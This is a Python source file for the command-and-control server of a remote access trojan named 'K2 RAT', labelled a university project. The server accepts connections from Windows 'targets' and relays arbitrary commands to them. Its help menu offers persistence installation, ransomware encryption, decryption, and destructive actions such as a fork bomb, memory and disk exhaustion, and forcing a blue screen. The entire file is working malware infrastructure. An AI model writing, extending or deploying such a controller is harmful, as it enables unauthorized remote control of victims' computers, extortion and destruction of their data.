#!/usr/bin/env python3
"""
K2 RAT - C2 Server for Windows Targets
NED University Project
"""

import socket
import threading
import time
from datetime import datetime

BANNER = """
    ╔════════════════════════════════════════════════════╗
    ║     K2 RAT - C2 SERVER (Windows Target)           ║
    ║     NED University Project 2026                   ║
    ║     🇵🇰 Made in Pakistan                           ║
    ╚════════════════════════════════════════════════════╝
"""

class C2Server:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.clients = {}
        self.running = True

    def log(self, msg):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(BANNER)
        self.log(f"C2 listening on {self.host}:{self.port}")
        threading.Thread(target=self.accept, daemon=True).start()
        self.command_loop()

    def accept(self):
        while self.running:
            try:
                client, addr = self.server.accept()
                threading.Thread(target=self.handle, args=(client, addr), daemon=True).start()
            except:
                pass

    def handle(self, client, addr):
        tid = f"WIN_{addr[0].replace('.', '')}"
        try:
            data = client.recv(4096).decode()
            self.log(f"✅ New target: {tid} - {addr[0]}")
            self.log(f"   {data}")
            
            self.clients[tid] = {
                'socket': client,
                'addr': addr,
                'hostname': data.split('from ')[1].split(' as ')[0] if 'from ' in data else 'Unknown'
            }
            
            def listen():
                while self.running and tid in self.clients:
                    try:
                        resp = client.recv(4096).decode()
                        if resp and resp != "ALIVE":
                            print(f"\n[Response] {tid}:\n{resp}\n{tid}> ", end="")
                    except:
                        break
                    time.sleep(0.1)
            
            threading.Thread(target=listen, daemon=True).start()
            
            while self.running and tid in self.clients:
                try:
                    client.send(b"HEARTBEAT")
                    time.sleep(5)
                except:
                    break
        except:
            pass
        finally:
            if tid in self.clients:
                del self.clients[tid]
            try:
                client.close()
            except:
                pass

    def send_cmd(self, tid, cmd):
        if tid not in self.clients:
            return False
        try:
            self.clients[tid]['socket'].send(f"EXEC:{cmd}".encode())
            self.log(f"Command to {tid}: {cmd}")
            return True
        except:
            return False

    def list_targets(self):
        print("\n" + "="*50)
        print("ACTIVE TARGETS")
        print("="*50)
        if not self.clients:
            print("No targets connected")
        else:
            for tid, info in self.clients.items():
                print(f"  ⚡ {tid} - {info['hostname']}")
        print("="*50)

    def command_loop(self):
        while self.running:
            try:
                cmd = input("K2> ").strip()
                if not cmd:
                    continue
                
                if cmd == "exit":
                    self.running = False
                    break
                elif cmd == "list":
                    self.list_targets()
                elif cmd.startswith("use "):
                    tid = cmd[4:].strip()
                    if tid in self.clients:
                        print(f"\nConnected to {tid}")
                        print("Commands: sysinfo, ransomware, decrypt, install, kill, help")
                        while tid in self.clients:
                            try:
                                c = input(f"{tid}> ").strip()
                                if c in ("back", "exit"):
                                    break
                                elif c == "help":
                                    print("""
Commands:
  sysinfo           - Show system info
  install           - Install persistence
  ransomware        - Encrypt secret folders
  decrypt           - Decrypt files
  kill forkbomb     - Kill with fork bomb
  kill memory       - Exhaust memory
  kill disk         - Fill disk with junk
  kill bsod         - Cause BSOD
  whoami            - Show current user
  cd <path>         - Change directory
  any command       - Run Windows command
""")
                                else:
                                    self.send_cmd(tid, c)
                            except KeyboardInterrupt:
                                break
                    else:
                        print("Target not found")
                elif cmd == "help":
                    print("Commands: list, use <target>, exit")
                else:
                    print("Unknown command")
            except KeyboardInterrupt:
                self.running = False
                break

def main():
    c2 = C2Server()
    try:
        c2.start()
    except:
        pass

if __name__ == "__main__":
    main()
